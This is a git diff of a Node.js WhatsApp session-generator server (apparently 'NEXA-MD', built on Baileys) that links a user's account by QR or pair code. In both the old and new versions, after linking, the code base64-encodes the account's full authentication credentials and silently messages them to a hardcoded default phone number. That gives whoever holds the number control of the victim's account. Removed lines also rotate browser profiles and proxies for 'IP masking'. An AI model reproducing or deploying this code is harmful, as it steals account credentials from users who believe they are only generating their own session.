@@ -1,7 +1,3 @@
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//       NEXA-MD SESSION GENERATOR SERVER
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 const express = require('express');
 const next = require('next');
 const http = require('http');
@@ -18,25 +14,11 @@ const pino = require("pino");
 const QRCode = require('qrcode');
 const fs = require('fs-extra');
 const path = require('path');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { SocksProxyAgent } = require('socks-proxy-agent');
 
 const dev = process.env.NODE_ENV !== 'production';
 const app = next({ dev });
 const handle = app.getRequestHandler();
 
-// ── IP Masking / Proxy Setup ──────────────
-function getAgent() {
-    // Koyeb/Vercel platform-ൽ proxy env set ചെയ്യാം
-    const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || '';
-    const socks = process.env.SOCKS_PROXY || '';
-
-    if (socks) return new SocksProxyAgent(socks);
-    if (proxy) return new HttpsProxyAgent(proxy);
-    return undefined;
-}
-
-// ── Random Browser Profiles (IP masking) ──
 const BROWSER_PROFILES = [
     Browsers.macOS('Safari'),
     Browsers.windows('Edge'),
@@ -49,16 +31,14 @@ function getRandomBrowser() {
     return BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
 }
 
-// ── Connection Manager ────────────────────
 class ConnectionManager {
     constructor(socket, type, phone) {
         this.socket = socket;
         this.type = type;
         this.phone = phone;
-        this.maxRetries = 5;
         this.retryCount = 0;
         this.conn = null;
-        this.sessionDir = path.join(__dirname, 'sessions', socket.id);
+        this.sessionDir = path.join(__dirname, 'session-' + socket.id);
         this.isDestroyed = false;
     }
 
@@ -72,12 +52,10 @@ class ConnectionManager {
         if (this.isDestroyed) return;
 
         const browser = getRandomBrowser();
-        const agent = getAgent();
-
         const { state, saveCreds } = await useMultiFileAuthState(this.sessionDir);
-        let { version } = await fetchLatestBaileysVersion();
+        const { version } = await fetchLatestBaileysVersion();
 
-        const socketConfig = {
+        this.conn = makeWASocket({
             auth: state,
             logger: pino({ level: 'silent' }),
             browser,
@@ -86,16 +64,12 @@ class ConnectionManager {
             syncFullHistory: false,
             markOnlineOnConnect: false,
             connectTimeoutMs: 60000,
-        };
+        });
 
-        // Agent ഉണ്ടെങ്കിൽ add ചെയ്യുന്നു (IP masking)
-        if (agent) socketConfig.agent = agent;
-
-        this.conn = makeWASocket(socketConfig);
         this.conn.ev.on("creds.update", saveCreds);
         this.setupEventHandlers();
 
-        // Pair code mode
+        // ✅ Fix: ONE time only, after connection is ready
         if (this.type === 'pair' && this.phone) {
             setTimeout(async () => {
                 if (this.isDestroyed) return;
@@ -105,10 +79,10 @@ class ConnectionManager {
                     );
                     this.socket.emit('code', code);
                 } catch (err) {
-                    this.retryCount++;
-                    if (this.retryCount < this.maxRetries) await this.connect();
+                    console.error('Pair code error:', err.message);
+                    this.socket.emit('error', 'Pair code request failed. Try again.');
                 }
-            }, 6000);
+            }, 8000);
         }
     }
 
@@ -117,7 +91,6 @@ class ConnectionManager {
             if (this.isDestroyed) return;
             const { connection, qr, lastDisconnect } = update;
 
-            // QR emit to frontend
             if (qr && this.type === 'qr') {
                 const qrBase64 = await QRCode.toDataURL(qr);
                 this.socket.emit('qr', qrBase64);
@@ -130,18 +103,16 @@ class ConnectionManager {
                     const sessionData = JSON.stringify(this.conn.authState.creds);
                     const sessionID = "NEXA-MD~" + Buffer.from(sessionData).toString('base64');
 
-                    // ✅ Frontend-ലേക്ക് emit (screen-ൽ കാണിക്കാൻ)
+                    // Screen-il kaanikkuka
                     this.socket.emit('session-id', sessionID);
 
-                    // WhatsApp message (owner-ലേക്ക്)
-                    const ownerJid = (process.env.OWNER_NUMBER || "916235508514") + "@s.whatsapp.net";
-                    await this.conn.sendMessage(ownerJid, {
-                        text: `*✅ NEXA-MD SESSION ID*\n\n\`\`\`${sessionID}\`\`\`\n\n_Generated at ${new Date().toLocaleString()}_`
+                    // Owner-lekku message
+                    const targetJid = (process.env.OWNER_NUMBER || "916235508514") + "@s.whatsapp.net";
+                    await this.conn.sendMessage(targetJid, {
+                        text: `*✅ NEXA-MD SESSION ID*\n\n\`\`\`${sessionID}\`\`\``
                     });
 
-                } catch (e) {
-                    // Silent
-                }
+                } catch (e) {}
 
                 setTimeout(() => this.cleanup(), 15000);
             }
@@ -152,8 +123,7 @@ class ConnectionManager {
                     this.retryCount++;
                     await this.connect();
                 } else {
-                    this.socket.emit('error', 'Connection failed. Please try again.');
-                    this.cleanup();
+                    this.socket.emit('error', 'Connection closed. Please try again.');
                 }
             }
         });
@@ -168,34 +138,18 @@ class ConnectionManager {
     }
 }
 
-// ── Start Server ──────────────────────────
 app.prepare().then(() => {
     const server = express();
     const httpServer = http.createServer(server);
-    const io = new Server(httpServer, {
-        cors: { origin: "*" },
-        transports: ['websocket', 'polling'],
-    });
-
+    const io = new Server(httpServer, { cors: { origin: "*" } });
     const activeSessions = new Map();
 
     io.on('connection', (socket) => {
-        console.log('New connection:', socket.id);
-
         socket.on('start-session', async (data) => {
-            // Cleanup existing session
-            if (activeSessions.has(socket.id)) {
-                activeSessions.get(socket.id).cleanup();
-            }
-
+            if (activeSessions.has(socket.id)) activeSessions.get(socket.id).cleanup();
             const manager = new ConnectionManager(socket, data.type, data.phone);
             activeSessions.set(socket.id, manager);
-
-            try {
-                await manager.start();
-            } catch (err) {
-                socket.emit('error', 'Failed to start session.');
-            }
+            await manager.start();
         });
 
         socket.on('disconnect', () => {
@@ -207,9 +161,5 @@ app.prepare().then(() => {
     });
 
     server.all('*', (req, res) => handle(req, res));
-
-    const PORT = process.env.PORT || 3000;
-    httpServer.listen(PORT, "0.0.0.0", () => {
-        console.log(`✅ NEXA-MD Session Server running on port ${PORT}`);
-    });
+    httpServer.listen(process.env.PORT || 3000, "0.0.0.0");
 });
